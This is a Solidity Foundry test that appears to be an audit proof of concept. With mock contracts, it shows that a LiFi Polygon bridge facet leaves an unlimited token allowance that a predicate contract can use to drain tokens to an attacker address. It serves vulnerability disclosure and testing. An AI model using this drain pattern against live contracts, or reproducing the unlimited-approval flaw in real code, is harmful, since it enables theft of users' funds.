// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.17;

import {Test} from "forge-std/Test.sol";
import {MockERC20} from "solmate/test/utils/mocks/MockERC20.sol";
import {PolygonBridgeFacet} from "lifi/Facets/PolygonBridgeFacet.sol";
import {IRootChainManager} from "lifi/Interfaces/IRootChainManager.sol";
import {ILiFi} from "lifi/Interfaces/ILiFi.sol";

contract MockERC20Predicate {
    function drain(MockERC20 token, address from, address to, uint256 amount) external {
        token.transferFrom(from, to, amount);
    }
}

contract MockRootChainManager is IRootChainManager {
    address public predicate;
    constructor(address _predicate) { predicate = _predicate; }

    function depositEtherFor(address) external payable override {}

    function depositFor(address, address rootToken, bytes calldata depositData) external override {
        uint256 amount = abi.decode(depositData, (uint256));
        MockERC20(rootToken).transferFrom(msg.sender, predicate, amount);
    }

    function rootToChildToken(address) external pure override returns (address childToken) {
        return address(0);
    }
}

contract PolygonBridgeFacetAllowanceTest is Test {
    MockERC20 internal token;
    MockERC20Predicate internal predicate;
    MockRootChainManager internal manager;
    PolygonBridgeFacet internal facet;
    address internal attacker = address(0xbeef);

    function setUp() public {
        token = new MockERC20("Mock", "MOCK", 18);
        predicate = new MockERC20Predicate();
        manager = new MockRootChainManager(address(predicate));
        facet = new PolygonBridgeFacet(manager, address(predicate));

        token.mint(address(this), 100 ether);
        token.approve(address(facet), type(uint256).max);

        // Grant the root chain manager allowance to pull tokens during deposit
        vm.prank(address(facet));
        token.approve(address(manager), type(uint256).max);
    }

    function test_UnlimitedAllowanceAllowsTokenDrain() public {
        ILiFi.BridgeData memory bridgeData = ILiFi.BridgeData({
            transactionId: bytes32("tx"),
            bridge: "",
            integrator: "",
            referrer: address(0),
            sendingAssetId: address(token),
            receiver: attacker,
            minAmount: 10 ether,
            destinationChainId: 137,
            hasSourceSwaps: false,
            hasDestinationCall: false
        });

        facet.startBridgeTokensViaPolygonBridge(bridgeData);

        // allowance remains unlimited after bridging
        assertEq(token.allowance(address(facet), address(predicate)), type(uint256).max);

        // attacker sends tokens to facet and predicate drains them
        token.mint(address(facet), 5 ether);
        predicate.drain(token, address(facet), attacker, 5 ether);

        assertEq(token.balanceOf(attacker), 5 ether);
    }
}

